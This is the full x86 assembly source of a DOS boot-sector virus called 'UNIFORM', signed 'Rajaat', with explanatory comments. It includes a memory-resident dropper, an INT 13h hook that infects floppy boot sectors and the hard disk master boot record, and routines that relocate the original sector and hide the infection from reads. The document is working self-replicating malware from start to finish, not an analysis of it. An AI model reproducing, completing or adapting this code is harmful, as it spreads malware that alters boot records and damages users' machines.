.model tiny
.code
.radix 16

boot_info               struc                   ; bootsector structure
  oem_name              db 8 dup (?)            ; oem name and version
  sect_size             dw ?                    ; bytes per sector
  clust_size            db ?                    ; sectors per cluster
  res_secs              dw ?                    ; reserved sectors before fat
  fat_count             db ?                    ; number of fats
  root_size             dw ?                    ; maximum root entries
  tot_secs              dw ?                    ; total sectors on disk
  media_type            db ?                    ; media type (unreliable)
  fat_size              dw ?                    ; sectors in fat (per fat)
  track_secs            dw ?                    ; sectors per track
  head_count            dw ?                    ; number of heads
  hidn_secs             dw ?                    ; hidden sectors
boot_info               ends

BASE            equ 7c00

;******************************************************************************
                org 100

install:        mov ah,9
                lea dx,msg
                int 21
                mov ax,3513
                int 21
                mov [old_int13],bx
                mov [old_int13+2],es
                mov ax,ds
                add ax,7c0
                mov ds,ax
                lea dx,new_int13-BASE
                mov ax,2513
                int 21
                lea dx,virus_end+400
                int 27
msg             db 0dh,0ah,'UNIFORM installed in memory!',0dh,0ah,'$'
;******************************************************************************
                org 7c00

virus           equ $                           ; virus also begins

boot_sector     equ $
                jmp boot_start                  ; jump to bootsector code
                db 90

boot_data       boot_info <'UNIFORM '>          ; bootsector info

                org boot_sector+3e              ; bootsector code

boot_start:     cli                             ; set initial registers, like
                xor bx,bx                       ; stack and data segment
                mov ds,bx
                mov ss,bx
                mov si,7c00
                mov sp,si
                sti

                sub word ptr ds:[413],virus_size_k ; reserve space for virus
                int 12

                push cs
                pop ds
                mov cl,6                        ; read rest of virus in
                shl ax,cl                       ; memory below tom
                push ax
                mov es,ax
                xor di,di
                mov cx,100
                rep movsw
                mov ax,offset init_boot-BASE
                push ax
                retf

old_int13       dw 0,0                          ; old int 13 pointer

init_boot:      xor ax,ax
                mov ds,ax
                cli
                lea di,old_int13-BASE
                lea ax,new_int13-BASE           ; hook the int 13 vector
                xchg ax,ds:[4*13]
                stosw
                mov ax,cs
                xchg ax,ds:[4*13+2]
                stosw

                sti

                xor ax,ax                       ; read the original sector
                mov es,ax                       ; at 0000:7C00
read_main_body: mov bx,7c00
                push es
                push bx
                mov ax,0201
                mov dx,0                        ; this gets modified
drivehead       equ word ptr $-2
                mov cx,0                        ; this gets modified
sectortrack     equ word ptr $-2
                int 13
                jc read_main_body               ; loop to read_main_body when
                                                ; a read error is occured

infect_mbr_now: mov ax,0201                     ; this reads the mbr while
                lea bx,virus_end-BASE           ; the virus is resident,
                push cs                         ; causing a mbr infection
                pop es
                mov cx,1
                mov dx,80
                int 13

                retf                            ; return to 0000:7C00

check_boot:     push es                         ; checks to see if the boot
                pop ds                          ; sector is the same as the
                push cs                         ; virus image. the zero flag
                pop es                          ; is set when they are the same
                mov si,bx
                add si,boot_data-boot_sector
                lea di,boot_data-BASE
                mov cx,8
                rep cmpsb
                or cx,cx
                ret

chain_to_int13: jmp dword ptr cs:[old_int13-BASE] ; chain to original int 13

handle_int13:   pushf                           ; call the original int 13
                call dword ptr cs:[old_int13-BASE]
                ret

new_int13:      cmp ah,2                        ; is it a read command
                jne chain_to_int13              ; no -> chain_to_int13
                cmp dh,0                        ; is it head 0
                jne chain_to_int13              ; no -> chain_to_int13
                cmp cx,1                        ; is it sector 1
                jne chain_to_int13              ; no -> chain_to_int13
                cmp dl,2                        ; is it diskdrive
                ja harddisk                     ; no -> harddisk

handle:         call handle_int13
                jnc boot_read
                retf 2

harddisk:       cmp dl,80                       ; is it the harddisk
                jne chain_to_int13              ; no -> chain_to_int13
                call handle_int13
                jnc handle_mbr
                retf 2

handle_mbr:     pushf
                push ds es si di cx
                call check_boot
                jnz infect_mbr
                pop cx
                mov cx,3
                jmp read_mbr

infect_mbr:     mov ax,0301
                mov cx,3
                mov cs:[sectortrack-BASE],cx
                mov cs:[drivehead-BASE],dx
                push ds
                pop es
                call handle_int13
                jc it_is_done
                mov ax,0301
                lea bx,boot_sector-BASE
                mov cx,1
                push cs
                pop es
                call handle_int13
it_is_done:     jmp wrong_media

boot_read:
                pushf
                push ds es si di cx
                call check_boot
                jnz infect_boot
                push ds
                pop es
                pop cx
                push bx bp
                call find_data_sector
                dec ax
                call convert_sector
                pop bp bx
read_mbr:       mov ax,0201
boot_done:      pop di si es ds
                popf
                jmp chain_to_int13

infect_boot:    add si,cx
                add di,cx
                push ax bx dx bp
                mov cx,3e-0bh
                rep movsb
                push ds
                pop es
                push bx bp
                call find_data_sector
                dec ax
                call convert_sector
                pop bp
                mov cs:[drivehead-BASE],dx
                mov cs:[sectortrack-BASE],cx
                push cx dx es
                push cs
                pop es
                mov ax,0301
                xor dh,dh
                mov cx,1
                lea bx,boot_sector-BASE
                call handle_int13
                jnc boot_altered
                pop es dx cx bx
write_protect:  pop bp dx bx ax
wrong_media:    pop cx di si es ds
                popf
                iret

boot_altered:   push ax bx bp
                call find_data_sector
                dec ax
                call convert_sector
                pop bp bx ax
                pop es dx cx bx
                mov ax,0301
                call handle_int13
                jmp write_protect

convert_sector: div es:[bp.track_secs+3]                ; convert sector format
                inc ah                                  ; to cylinder, head and
                xchg cl,ah      ; cl = sector           ; sector format
                xor ah,ah
                div es:[bp.head_count+3]
                mov dh,ah
                mov ch,al
                ret

find_data_sector:                               ; locate the first data sector
                mov bp,bx                       ; of the drive
                xor dx,dx
                mov ax,es:[bp.fat_size+3]
                xor cx,cx
                mov cl,es:[bp.fat_count+3]
                mul cx
                add ax,es:[bp.res_secs+3]
                mov bx,ax
                mov ax,es:[bp.root_size+3]
                mov cl,20
                mul cx
                mov cx,es:[bp.sect_size+3]
                div cx
                add ax,bx
                ret

                db 'Rajaat'

                org boot_sector+1fe

                dw 0aa55                        ; bootsector signature

virus_end       equ $
virus_size_k    equ (($-virus) / 400) + 1       ; virus size in kilobytes

end install                                     ; end of virus code
